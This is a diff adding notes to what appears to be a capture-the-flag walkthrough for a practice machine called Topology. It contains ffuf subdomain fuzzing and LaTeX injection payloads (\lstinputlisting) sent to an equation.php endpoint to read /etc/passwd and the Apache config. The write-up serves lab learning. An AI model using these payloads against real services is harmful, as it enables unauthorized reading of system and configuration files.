@@ -74,3 +74,28 @@ Nmap done: 1 IP address (1 host up) scanned in 33.40 seconds
 lklein@topology.htb
 
 ```
+subdomain:
+```sh
+ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.topology.htb" -u http://topology.htb  -t 100 --fw 1612
+```
+
+```
+dev
+stats
+```
+
+
+```sh
+$\lstinputlisting{/etc/passwd}$
+```
+
+
+```
+http://latex.topology.htb/equation.php?eqn=%24%5Clstinputlisting%7B%2Fetc%2Fpasswd%7D%24&submit=
+```
+
+
+Read apache2 config
+```sh
+$\lstinputlisting{/etc/apache2/apache2.conf}$
+```
